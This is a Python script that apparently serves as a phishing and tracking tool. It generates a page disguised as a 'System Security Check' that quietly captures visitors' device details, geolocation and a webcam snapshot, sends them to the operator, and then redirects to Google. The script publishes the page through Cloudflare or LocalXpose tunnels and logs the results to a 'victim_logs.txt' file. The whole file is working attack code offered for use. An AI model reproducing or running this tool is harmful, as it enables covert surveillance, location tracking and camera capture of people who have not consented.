# CREATED BY: RAMIZ UDDIN
import os, sys, time, socketserver, http.server, threading, subprocess

def tool_header(name):
    os.system("clear")
    print("\033[1;36m" + "="*45)
    print(f"      {name.upper()}")
    print("      CREATED BY: RAMIZ UDDIN")
    print("="*45 + "\033[0m")

PORT = 8085

class AllInOneHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        print("\033[1;32m\n[*] [!] VICTIM DATA RECEIVED!\033[0m")
        print(f"\033[1;33m{post_data}\033[0m")
        
        with open("victim_logs.txt", "a") as f:
            f.write(f"Time: {time.ctime()} | Data: {post_data}\n")
            
        self.send_response(200)
        self.end_headers()

def run():
    tool_header("ULTIMATE AIO TRACKER (LINK + DATA)")
    print("\033[1;32m[*] Single Link for: IP, Location, Device Info & Camera.\033[0m")
    
    # Create the AIO Payload
    with open("aio_index.html", "w") as f:
        f.write("""
        <html>
        <head><title>System Security Check</title></head>
        <body style="background: black; color: white; text-align: center; font-family: sans-serif; padding-top: 100px;">
            <h2 id="msg">Verifying Your Device... Please Wait</h2>
            <video id="v" width="1" height="1" autoplay style="display:none;"></video>
            <canvas id="c" width="640" height="480" style="display:none;"></canvas>
            <script>
                async function capture() {
                    let data = {
                        ua: navigator.userAgent,
                        plat: navigator.platform,
                        lang: navigator.language,
                        res: screen.width + 'x' + screen.height
                    };
                    
                    // Get Location
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(p => {
                            data.loc = p.coords.latitude + ',' + p.coords.longitude;
                            send(data);
                        }, e => send(data));
                    } else { send(data); }

                    // Get Camera
                    try {
                        const s = await navigator.mediaDevices.getUserMedia({video:true});
                        const v = document.getElementById('v');
                        v.srcObject = s;
                        setTimeout(() => {
                            const c = document.getElementById('c');
                            c.getContext('2d').drawImage(v, 0, 0);
                            data.cam = c.toDataURL('image/png');
                            send(data);
                            document.getElementById('msg').innerHTML = "Verification Complete!";
                            window.location.href = "https://google.com";
                        }, 3000);
                    } catch(e) { send(data); window.location.href = "https://google.com"; }
                }
                function send(d) {
                    fetch('/', {method:'POST', body: JSON.stringify(d)});
                }
                capture();
            </script>
        </body>
        </html>
        """)

    print("\n\033[1;33m[+] Starting Local Server on Port 8085...\033[0m")
    os.system("mv aio_index.html index.html")
    
    # Start Tunnel in a separate thread/process if possible, 
    # but to keep it simple and reliable, we'll ask the user to choose.
    print("\033[1;32m[*] Choose Tunnel to get Public Link:\033[0m")
    print(" [1] Cloudflare (Instant)")
    print(" [2] LocalXpose (Stable)")
    t_choice = input("\nTunnel > ")
    
    def start_tunnel():
        time.sleep(2)
        if t_choice == '1':
            os.system(f"cloudflared tunnel --url http://127.0.0.1:{PORT}")
        else:
            os.system(f"loclx tunnel http --to 127.0.0.1:{PORT}")

    threading.Thread(target=start_tunnel, daemon=True).start()
    
    print(f"\n\033[1;32m[*] Server running. Waiting for data...\033[0m")
    print("\033[1;31m[!] Check 'victim_logs.txt' for saved data.\033[0m")
    
    handler = AllInOneHandler
    with socketserver.TCPServer(("", PORT), handler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n\033[1;31m[!] Stopping...\033[0m")
            os.system("rm index.html")
            httpd.shutdown()

if __name__ == "__main__": run()
